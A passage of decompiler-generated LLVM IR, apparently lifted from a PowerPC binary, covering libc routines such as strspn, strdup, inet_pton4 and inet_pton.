  %v3_10012124 = load i8, i8* %v2_10012124, align 1
  %v4_10012124 = zext i8 %v3_10012124 to i32
  store i32 %v4_10012124, i32* %r9.global-to-local, align 4
  %v3_10012128 = icmp eq i8 %v3_10012124, 0
  store i1 %v3_10012128, i1* %cr7_eq.global-to-local, align 1
  %v2_1001212c = load i32, i32* %r10.global-to-local, align 4
  %v3_1001212c = add i32 %v2_1001212c, 1
  %v4_1001212c = inttoptr i32 %v3_1001212c to i8*
  store i8 %v3_10012124, i8* %v4_1001212c, align 1
  %v0_10012130 = load i32, i32* @lr, align 4
  %v1_10012130 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10012130, i32 %v0_10012130)
  %v0_10012134 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012134 = add i32 %v0_10012134, -1
  store i32 %v1_10012134, i32* %ctr.global-to-local, align 4
  %v2_10012134 = icmp eq i32 %v1_10012134, 0
  br i1 %v2_10012134, label %dec_label_pc_10012138, label %dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge

dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge: ; preds = %dec_label_pc_100120d4
  %v0_100120d8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100120d4

dec_label_pc_10012138:                            ; preds = %dec_label_pc_100120d4
  %v0_10012138 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012138 = urem i32 %v0_10012138, 4
  store i32 %v1_10012138, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001215c

dec_label_pc_10012140:                            ; preds = %dec_label_pc_1001215c, %dec_label_pc_10012140.dec_label_pc_10012140_crit_edge
  %v0_10012144 = phi i32 [ %v0_10012144.pre, %dec_label_pc_10012140.dec_label_pc_10012140_crit_edge ], [ %v0_1001215c, %dec_label_pc_1001215c ]
  %v0_10012140 = load i32, i32* @r4, align 4
  %v1_10012140 = inttoptr i32 %v0_10012140 to i8*
  %v2_10012140 = load i8, i8* %v1_10012140, align 1
  %v3_10012140 = zext i8 %v2_10012140 to i32
  store i32 %v3_10012140, i32* %r9.global-to-local, align 4
  %v1_10012144 = add i32 %v0_10012144, -1
  store i32 %v1_10012144, i32* %r5.global-to-local, align 4
  %v1_10012148 = add i32 %v0_10012140, 1
  store i32 %v1_10012148, i32* @r4, align 4
  %v3_1001214c = icmp eq i8 %v2_10012140, 0
  store i1 %v3_1001214c, i1* %cr7_eq.global-to-local, align 1
  %v2_10012150 = load i32, i32* %r11.global-to-local, align 4
  %v3_10012150 = add i32 %v2_10012150, 1
  %v4_10012150 = inttoptr i32 %v3_10012150 to i8*
  store i8 %v2_10012140, i8* %v4_10012150, align 1
  store i32 %v3_10012150, i32* %r11.global-to-local, align 4
  %v0_10012154 = load i32, i32* @lr, align 4
  %v1_10012154 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10012154, i32 %v0_10012154)
  %v0_10012164 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012164 = add i32 %v0_10012164, -1
  store i32 %v1_10012164, i32* %ctr.global-to-local, align 4
  %v2_10012164 = icmp eq i32 %v1_10012164, 0
  br i1 %v2_10012164, label %dec_label_pc_10012168, label %dec_label_pc_10012140.dec_label_pc_10012140_crit_edge

dec_label_pc_10012140.dec_label_pc_10012140_crit_edge: ; preds = %dec_label_pc_10012140
  %v0_10012144.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012140

dec_label_pc_1001215c:                            ; preds = %dec_label_pc_100120bc, %dec_label_pc_10012138
  %v0_1001215c = phi i32 [ %arg2, %dec_label_pc_100120bc ], [ %v1_10012138, %dec_label_pc_10012138 ]
  store i32 %v0_1001215c, i32* %ctr.global-to-local, align 4
  %v2_100121643 = icmp eq i32 %v0_1001215c, 0
  br i1 %v2_100121643, label %dec_label_pc_10012168, label %dec_label_pc_10012140

dec_label_pc_10012168:                            ; preds = %dec_label_pc_10012140, %dec_label_pc_1001215c
  %v0_10012168 = load i32, i32* %r9.global-to-local, align 4
  %v3_10012168 = icmp eq i32 %v0_10012168, 0
  store i1 %v3_10012168, i1* %cr7_eq.global-to-local, align 1
  %v0_1001216c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10012168, i32 %v0_1001216c)
  %v0_10012170 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012170 = trunc i32 %v0_10012170 to i8
  %v2_10012170 = load i32, i32* %r11.global-to-local, align 4
  %v3_10012170 = add i32 %v2_10012170, 1
  %v4_10012170 = inttoptr i32 %v3_10012170 to i8*
  store i8 %v1_10012170, i8* %v4_10012170, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1001215c, { 1, 2, 0 }
  uselistorder i32 %v1_10012164, { 1, 0 }
  uselistorder i32 %v1_10012138, { 1, 0 }
  uselistorder i32 %v1_10012134, { 1, 0 }
  uselistorder i32 %v2_100120e4, { 1, 0 }
  uselistorder i32 %v1_100120b0, { 1, 0 }
  uselistorder i32 %v0_100120ac, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10012168, { 1, 0 }
  uselistorder label %dec_label_pc_1001215c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100121a81 = load i32, i32* @r3, align 4
  %v1_100121a82 = inttoptr i32 %v0_100121a81 to i8*
  %v2_100121a83 = load i8, i8* %v1_100121a82, align 1
  %v3_100121ac6 = icmp eq i8 %v2_100121a83, 0
  br i1 %v3_100121ac6, label %dec_label_pc_100121bc, label %dec_label_pc_100121b4

dec_label_pc_10012184:                            ; preds = %dec_label_pc_10012184, %dec_label_pc_100121b4
  %v0_10012184 = phi i32 [ %v1_10012188, %dec_label_pc_10012184 ], [ %tmp, %dec_label_pc_100121b4 ]
  %v1_10012184 = inttoptr i32 %v0_10012184 to i8*
  %v2_10012184 = load i8, i8* %v1_10012184, align 1
  %v1_10012188 = add i32 %v0_10012184, 1
  %v3_1001218c = icmp eq i8 %v2_10012184, 0
  %v4_10012190 = icmp eq i8 %v0_100121908.in, %v2_10012184
  %brmerge = or i1 %v3_1001218c, %v4_10012190
  br i1 %brmerge, label %dec_label_pc_10012198, label %dec_label_pc_10012184

dec_label_pc_10012198:                            ; preds = %dec_label_pc_10012184
  br i1 %v3_1001218c, label %dec_label_pc_100121bc, label %dec_label_pc_100121a0

dec_label_pc_100121a0:                            ; preds = %dec_label_pc_10012198
  %v1_100121a0 = add i32 %v0_100121a0, 1
  %v1_100121a4 = add i32 %v0_100121a4, 1
  %v1_100121a8 = inttoptr i32 %v1_100121a4 to i8*
  %v2_100121a8 = load i8, i8* %v1_100121a8, align 1
  %v3_100121ac = icmp eq i8 %v2_100121a8, 0
  br i1 %v3_100121ac, label %dec_label_pc_100121bc, label %dec_label_pc_100121b4

dec_label_pc_100121b4:                            ; preds = %entry, %dec_label_pc_100121a0
  %v0_100121a4 = phi i32 [ %v1_100121a4, %dec_label_pc_100121a0 ], [ %v0_100121a81, %entry ]
  %v0_100121a0 = phi i32 [ %v1_100121a0, %dec_label_pc_100121a0 ], [ 0, %entry ]
  %v0_100121908.in = phi i8 [ %v2_100121a8, %dec_label_pc_100121a0 ], [ %v2_100121a83, %entry ]
  br label %dec_label_pc_10012184

dec_label_pc_100121bc:                            ; preds = %dec_label_pc_100121a0, %dec_label_pc_10012198, %entry
  %v0_100121bc = phi i32 [ 0, %entry ], [ %v1_100121a0, %dec_label_pc_100121a0 ], [ %v0_100121a0, %dec_label_pc_10012198 ]
  ret i32 %v0_100121bc

; uselistorder directives
  uselistorder i32 %v0_10012184, { 1, 0 }
  uselistorder label %dec_label_pc_100121b4, { 1, 0 }
  uselistorder label %dec_label_pc_10012184, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_100121d8 = call i32 @__GI_strlen()
  %v1_100121dc = add i32 %v0_100121d8, 1
  store i32 %v1_100121dc, i32* @r29, align 4
  store i32 %v1_100121dc, i32* @r3, align 4
  store i32 268509672, i32* @lr, align 4
  %v0_100121e4 = call i32 @malloc()
  store i32 %v0_100121e4, i32* @r3, align 4
  %v0_100121e8 = load i32, i32* @r28, align 4
  store i32 %v0_100121e8, i32* @r4, align 4
  store i32 %v0_100121e4, i32* @r31, align 4
  %v3_100121ec = icmp eq i32 %v0_100121e4, 0
  %v0_100121f0 = load i32, i32* @r29, align 4
  store i32 %v0_100121f0, i32* @r5, align 4
  br i1 %v3_100121ec, label %dec_label_pc_100121fc, label %dec_label_pc_100121f8

dec_label_pc_100121f8:                            ; preds = %entry
  store i32 268509692, i32* @lr, align 4
  %v0_100121f8 = call i32 @memcpy()
  %v0_10012200.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100121fc

dec_label_pc_100121fc:                            ; preds = %entry, %dec_label_pc_100121f8
  %v0_10012200 = phi i32 [ 0, %entry ], [ %v0_10012200.pre, %dec_label_pc_100121f8 ]
  ret i32 %v0_10012200

; uselistorder directives
  uselistorder i32 ()* @malloc, { 11, 8, 7, 5, 4, 10, 9, 3, 15, 14, 13, 12, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_100121fc, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10012214 = load i32, i32* @lr, align 4
  store i32 %v0_10012214, i32* %r0.global-to-local, align 4
  %v0_1001221c = call i32 @__asm_mfcr()
  store i32 %v0_1001221c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10012228 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10012228, i32* %r7.global-to-local, align 4
  %v0_1001222c = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10012294

dec_label_pc_10012244:                            ; preds = %dec_label_pc_10012294
  %v3_10012244 = icmp eq i32 %v0_100122b8, 4
  store i1 %v3_10012244, i1* %cr7_eq.global-to-local, align 1
  %v0_10012248 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10012248, label %dec_label_pc_10012280, label %dec_label_pc_1001224c

dec_label_pc_1001224c:                            ; preds = %dec_label_pc_10012244
  %v0_1001224c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001224c = inttoptr i32 %v0_1001224c to i8*
  %v2_1001224c = load i8, i8* %v1_1001224c, align 1
  %v3_1001224c = zext i8 %v2_1001224c to i32
  %v1_10012250 = mul nuw nsw i32 %v3_1001224c, 10
  %v1_10012254 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012254 = add i32 %v1_10012250, %v1_10012254
  %v1_10012258 = add i32 %v2_10012254, -48
  store i32 %v1_10012258, i32* %r0.global-to-local, align 4
  %v2_1001225c = icmp ugt i32 %v1_10012258, 255
  %v3_1001225c = icmp eq i32 %v1_10012258, 255
  store i1 %v3_1001225c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001225c, label %dec_label_pc_100122dc, label %dec_label_pc_10012264

dec_label_pc_10012264:                            ; preds = %dec_label_pc_1001224c
  %v1_10012264 = trunc i32 %v1_10012258 to i8
  store i8 %v1_10012264, i8* %v1_1001224c, align 1
  %v0_10012268 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10012268, label %dec_label_pc_1001226c, label %dec_label_pc_10012294.backedge

dec_label_pc_1001226c:                            ; preds = %dec_label_pc_10012264
  %v0_1001226c = load i32, i32* %r10.global-to-local, align 4
  %v1_1001226c = add i32 %v0_1001226c, 1
  store i32 %v1_1001226c, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_10012274 = icmp sgt i32 %v1_1001226c, 4
  %v3_10012274 = icmp eq i32 %v1_1001226c, 4
  store i1 %v3_10012274, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10012274, label %dec_label_pc_100122dc, label %dec_label_pc_10012294.backedge

dec_label_pc_10012280:                            ; preds = %dec_label_pc_10012244
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10012284 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_10012284.not = xor i1 %v0_10012284, true
  %v0_10012288 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10012244, %v0_10012288
  %or.cond = or i1 %brmerge, %v0_10012284.not
  br i1 %or.cond, label %dec_label_pc_100122dc, label %dec_label_pc_10012290

dec_label_pc_10012290:                            ; preds = %dec_label_pc_10012280
  %v0_10012290 = load i32, i32* %r6.global-to-local, align 4
  %v1_10012290 = trunc i32 %v0_10012290 to i8
  %v2_10012290 = load i32, i32* %r7.global-to-local, align 4
  %v3_10012290 = add i32 %v2_10012290, 1
  %v4_10012290 = inttoptr i32 %v3_10012290 to i8*
  store i8 %v1_10012290, i8* %v4_10012290, align 1
  store i32 %v3_10012290, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10012294.backedge

dec_label_pc_10012294.backedge:                   ; preds = %dec_label_pc_10012290, %dec_label_pc_10012264, %dec_label_pc_1001226c
  %v0_10012294.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10012298.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012294

dec_label_pc_10012294:                            ; preds = %dec_label_pc_10012294.backedge, %entry
  %v0_10012298 = phi i32 [ %v0_10012298.pre, %dec_label_pc_10012294.backedge ], [ 0, %entry ]
  %v0_1001229c = phi i32 [ %v0_10012294.pre, %dec_label_pc_10012294.backedge ], [ %v0_1001221c, %entry ]
  %v1_10012294 = inttoptr i32 %v0_1001229c to i8*
  %v2_10012294 = load i8, i8* %v1_10012294, align 1
  %v3_10012294 = zext i8 %v2_10012294 to i32
  store i32 %v3_10012294, i32* %r11.global-to-local, align 4
  %v3_10012298 = icmp eq i32 %v0_10012298, 0
  store i1 %v3_10012298, i1* %cr4_eq.global-to-local, align 1
  %v1_1001229c = add i32 %v0_1001229c, 1
  store i32 %v1_1001229c, i32* %r3.global-to-local, align 4
  %v3_100122a0 = icmp eq i8 %v2_10012294, 0
  store i1 %v3_100122a0, i1* %cr7_eq.global-to-local, align 1
  %v1_100122a4 = add nsw i32 %v3_10012294, -48
  store i32 %v1_100122a4, i32* %r0.global-to-local, align 4
  %v2_100122a8 = icmp ugt i32 %v1_100122a4, 9
  store i1 %v2_100122a8, i1* %cr6_gt.global-to-local, align 1
  %v3_100122ac = icmp eq i8 %v2_10012294, 46
  store i1 %v3_100122ac, i1* %cr1_eq.global-to-local, align 1
  %v0_100122b0 = load i4, i4* @cr4, align 1
  %v1_100122b0 = call %2 @__asm_mcrf_cr0_write(i4 %v0_100122b0)
  %v4_100122b0 = extractvalue %2 %v1_100122b0, 2
  store i1 %v4_100122b0, i1* %cr0_eq.global-to-local, align 1
  %v0_100122b4 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_100122b8 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_100122b4, label %dec_label_pc_100122b8, label %dec_label_pc_10012244

dec_label_pc_100122b8:                            ; preds = %dec_label_pc_10012294
  %v3_100122b8 = icmp eq i32 %v0_100122b8, 3
  store i1 %v3_100122b8, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_100122b8, 4
  br i1 %tmp9, label %dec_label_pc_100122dc, label %dec_label_pc_100122c0

dec_label_pc_100122c0:                            ; preds = %dec_label_pc_100122b8
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10012228, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100122d0.951 to i32), i32* @lr, align 4
  %v0_100122cc = call i32 @memcpy()
  br label %dec_label_pc_100122dc

dec_label_pc_100122dc:                            ; preds = %dec_label_pc_10012280, %dec_label_pc_1001224c, %dec_label_pc_1001226c, %dec_label_pc_100122b8, %dec_label_pc_100122c0
  %storemerge = phi i32 [ 1, %dec_label_pc_100122c0 ], [ 0, %dec_label_pc_100122b8 ], [ 0, %dec_label_pc_1001226c ], [ 0, %dec_label_pc_1001224c ], [ 0, %dec_label_pc_10012280 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1001222c, i32* %r0.global-to-local, align 4
  %v1_100122ec = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001221c)
  %v4_100122ec = extractvalue %0 %v1_100122ec, 2
  store i1 %v4_100122ec, i1* %cr0_eq.global-to-local, align 1
  %v9_100122ec = extractvalue %0 %v1_100122ec, 7
  store i4 %v9_100122ec, i4* @cr4, align 1
  %v0_100122f0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100122f0

; uselistorder directives
  uselistorder i32 %v1_1001226c, { 1, 0, 2 }
  uselistorder i32 %v1_10012258, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1001221c, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_100122dc, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10012294.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_100122f4 = icmp eq i32 %arg1, 2
  %v0_100122f8 = load i32, i32* @lr, align 4
  store i32 %v0_100122f8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_100122f4, label %dec_label_pc_10012320, label %dec_label_pc_10012314

dec_label_pc_10012314:                            ; preds = %entry
  %v3_10012314 = icmp eq i32 %arg1, 10
  br i1 %v3_10012314, label %dec_label_pc_10012334, label %dec_label_pc_100124d0

dec_label_pc_10012320:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268509996, i32* @lr, align 4
  %v3_10012328 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10012328, i32* %r3.global-to-local, align 4
  store i32 %v3_10012328, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100124e8

dec_label_pc_10012334:                            ; preds = %dec_label_pc_10012314
  %v2_10012334 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012334, i32* %r3.global-to-local, align 4
  store i32 268510020, i32* @lr, align 4
  %v3_10012340 = call i32 @__GI_memset(i32 %v2_10012334, i32 0, i32 16)
  store i32 %v3_10012340, i32* %r3.global-to-local, align 4
  %v0_10012344 = load i32, i32* @r29, align 4
  %v1_10012344 = inttoptr i32 %v0_10012344 to i8*
  %v2_10012344 = load i8, i8* %v1_10012344, align 1
  %v3_10012344 = zext i8 %v2_10012344 to i32
  store i32 %v3_10012344, i32* %r0.global-to-local, align 4
  store i32 %v3_10012340, i32* @r31, align 4
  %v2_1001234c = add i32 %v3_10012340, 16
  store i32 %v2_1001234c, i32* @r27, align 4
  %v3_10012350 = icmp eq i8 %v2_10012344, 58
  br i1 %v3_10012350, label %dec_label_pc_10012358, label %dec_label_pc_10012364

dec_label_pc_10012358:                            ; preds = %dec_label_pc_10012334
  %v1_10012358 = add i32 %v0_10012344, 1
  %v2_10012358 = inttoptr i32 %v1_10012358 to i8*
  %v3_10012358 = load i8, i8* %v2_10012358, align 1
  %v4_10012358 = zext i8 %v3_10012358 to i32
  store i32 %v4_10012358, i32* %r0.global-to-local, align 4
  store i32 %v1_10012358, i32* @r29, align 4
  %v3_1001235c = icmp eq i8 %v3_10012358, 58
  br i1 %v3_1001235c, label %dec_label_pc_10012364, label %dec_label_pc_100124e4

dec_label_pc_10012364:                            ; preds = %dec_label_pc_10012358, %dec_label_pc_10012334
  %v0_10012364 = phi i32 [ %v1_10012358, %dec_label_pc_10012358 ], [ %v0_10012344, %dec_label_pc_10012334 ]
  store i32 %v0_10012364, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_100124383036 = inttoptr i32 %v0_10012364 to i8*
  %v2_100124383137 = load i8, i8* %v1_100124383036, align 1
  %v3_100124383238 = zext i8 %v2_100124383137 to i32
  store i32 %v3_100124383238, i32* %r3.global-to-local, align 4
  store i32 268510272, i32* @lr, align 4
  %v1_1001243c3339 = call i32 @__GI_tolower(i32 %v3_100124383238)
  store i32 %v1_1001243c3339, i32* %r3.global-to-local, align 4
  store i32 %v1_1001243c3339, i32* @r30, align 4
  %v3_100124403440 = icmp eq i32 %v1_1001243c3339, 0
  br i1 %v3_100124403440, label %dec_label_pc_10012448, label %dec_label_pc_10012370.lr.ph

dec_label_pc_10012370:                            ; preds = %dec_label_pc_10012370.lr.ph, %dec_label_pc_10012438.backedge
  %v1_1001243c35 = phi i32 [ %v1_1001243c3341, %dec_label_pc_10012370.lr.ph ], [ %v1_1001243c, %dec_label_pc_10012438.backedge ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001d8c8.952 to i32), i32* @r25, align 4
  %v0_1001237c = load i32, i32* @r29, align 4
  %v1_1001237c = add i32 %v0_1001237c, 1
  store i32 %v1_1001237c, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001d8c8.952 to i32), i32* @r3, align 4
  store i32 268510088, i32* @lr, align 4
  %v3_10012384 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1001d8c8.952 to i32), i32 %v1_1001243c35)
  store i32 %v3_10012384, i32* %r3.global-to-local, align 4
  %v3_10012388 = icmp eq i32 %v3_10012384, 0
  br i1 %v3_10012388, label %dec_label_pc_100123a8, label %dec_label_pc_10012390

dec_label_pc_10012390:                            ; preds = %dec_label_pc_10012370
  %v0_10012390 = load i32, i32* @r25, align 4
  %v2_10012390 = sub i32 %v3_10012384, %v0_10012390
  store i32 %v2_10012390, i32* %r0.global-to-local, align 4
  %v0_10012394 = load i32, i32* @r28, align 4
  %v1_10012394 = mul i32 %v0_10012394, 16
  store i32 %v1_10012394, i32* %r9.global-to-local, align 4
  %v2_10012398 = or i32 %v1_10012394, %v2_10012390
  store i32 %v2_10012398, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10012398, 65536
  br i1 %tmp19, label %dec_label_pc_10012434, label %dec_label_pc_100124e4

dec_label_pc_100123a8:                            ; preds = %dec_label_pc_10012370
  %v0_100123a8 = load i32, i32* @r30, align 4
  %v3_100123a8 = icmp eq i32 %v0_100123a8, 58
  br i1 %v3_100123a8, label %dec_label_pc_100123b0, label %dec_label_pc_10012404

dec_label_pc_100123b0:                            ; preds = %dec_label_pc_100123a8
  %v0_100123b0 = load i32, i32* @r23, align 4
  %v3_100123b0 = icmp eq i32 %v0_100123b0, 0
  br i1 %v3_100123b0, label %dec_label_pc_100123b8, label %dec_label_pc_100123cc

dec_label_pc_100123b8:                            ; preds = %dec_label_pc_100123b0
  %v0_100123b8 = load i32, i32* @r24, align 4
  %v3_100123b8 = icmp eq i32 %v0_100123b8, 0
  br i1 %v3_100123b8, label %dec_label_pc_100123c0, label %dec_label_pc_100124e4

dec_label_pc_100123c0:                            ; preds = %dec_label_pc_100123b8
  %v0_100123c0 = load i32, i32* @r31, align 4
  store i32 %v0_100123c0, i32* @r24, align 4
  %v0_100123c4 = load i32, i32* @r29, align 4
  store i32 %v0_100123c4, i32* @r26, align 4
  br label %dec_label_pc_10012438.backedge

dec_label_pc_100123cc:                            ; preds = %dec_label_pc_100123b0
  %v0_100123cc = load i32, i32* @r29, align 4
  %v1_100123cc = inttoptr i32 %v0_100123cc to i8*
  %v2_100123cc = load i8, i8* %v1_100123cc, align 1
  %v3_100123cc = zext i8 %v2_100123cc to i32
  store i32 %v3_100123cc, i32* %r0.global-to-local, align 4
  %v3_100123d0 = icmp eq i8 %v2_100123cc, 0
  br i1 %v3_100123d0, label %dec_label_pc_100124e4, label %dec_label_pc_100123d8

dec_label_pc_100123d8:                            ; preds = %dec_label_pc_100123cc
  %v0_100123d8 = load i32, i32* @r31, align 4
  %v1_100123d8 = add i32 %v0_100123d8, 2
  store i32 %v1_100123d8, i32* %r0.global-to-local, align 4
  %v1_100123dc = load i32, i32* @r27, align 4
  %v3_100123dc = icmp ugt i32 %v1_100123d8, %v1_100123dc
  br i1 %v3_100123dc, label %dec_label_pc_100124e4, label %dec_label_pc_100123e4

dec_label_pc_100123e4:                            ; preds = %dec_label_pc_100123d8
  %v0_100123e4 = load i32, i32* @r28, align 4
  %v1_100123e4 = udiv i32 %v0_100123e4, 256
  store i32 %v1_100123e4, i32* %r0.global-to-local, align 4
  %v1_100123e8 = trunc i32 %v0_100123e4 to i8
  %v3_100123e8 = add i32 %v0_100123d8, 1
  %v4_100123e8 = inttoptr i32 %v3_100123e8 to i8*
  store i8 %v1_100123e8, i8* %v4_100123e8, align 1
  %v0_100123ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100123ec = trunc i32 %v0_100123ec to i8
  %v2_100123ec = load i32, i32* @r31, align 4
  %v3_100123ec = inttoptr i32 %v2_100123ec to i8*
  store i8 %v1_100123ec, i8* %v3_100123ec, align 1
  %v0_100123f0 = load i32, i32* @r29, align 4
  store i32 %v0_100123f0, i32* @r26, align 4
  %v0_100123f4 = load i32, i32* @r31, align 4
  %v1_100123f4 = add i32 %v0_100123f4, 2
  store i32 %v1_100123f4, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001243830 = inttoptr i32 %v0_100123f0 to i8*
  %v2_1001243831 = load i8, i8* %v1_1001243830, align 1
  %v3_1001243832 = zext i8 %v2_1001243831 to i32
  store i32 %v3_1001243832, i32* %r3.global-to-local, align 4
  store i32 268510272, i32* @lr, align 4
  %v1_1001243c33 = call i32 @__GI_tolower(i32 %v3_1001243832)
  store i32 %v1_1001243c33, i32* %r3.global-to-local, align 4
  store i32 %v1_1001243c33, i32* @r30, align 4
  %v3_1001244034 = icmp eq i32 %v1_1001243c33, 0
  br i1 %v3_1001244034, label %dec_label_pc_10012448, label %dec_label_pc_10012370.lr.ph

dec_label_pc_10012370.lr.ph:                      ; preds = %dec_label_pc_10012364, %dec_label_pc_100123e4
  %v1_1001243c3341 = phi i32 [ %v1_1001243c33, %dec_label_pc_100123e4 ], [ %v1_1001243c3339, %dec_label_pc_10012364 ]
  br label %dec_label_pc_10012370

dec_label_pc_10012404:                            ; preds = %dec_label_pc_100123a8
  %v3_10012404 = icmp eq i32 %v0_100123a8, 46
  br i1 %v3_10012404, label %dec_label_pc_1001240c, label %dec_label_pc_100124e4

dec_label_pc_1001240c:                            ; preds = %dec_label_pc_10012404
  %v0_1001240c = load i32, i32* @r31, align 4
  %v1_1001240c = add i32 %v0_1001240c, 4
  store i32 %v1_1001240c, i32* @r30, align 4
  %v1_10012410 = load i32, i32* @r27, align 4
  %v3_10012410 = icmp ugt i32 %v1_1001240c, %v1_10012410
  br i1 %v3_10012410, label %dec_label_pc_100124e4, label %dec_label_pc_10012418

dec_label_pc_10012418:                            ; preds = %dec_label_pc_1001240c
  %v0_1001241c = load i32, i32* @r26, align 4
  store i32 %v0_1001241c, i32* %r3.global-to-local, align 4
  store i32 268510244, i32* @lr, align 4
  %v3_10012420 = call i32 @inet_pton4(i32 %v0_1001241c, i32 %v0_1001240c)
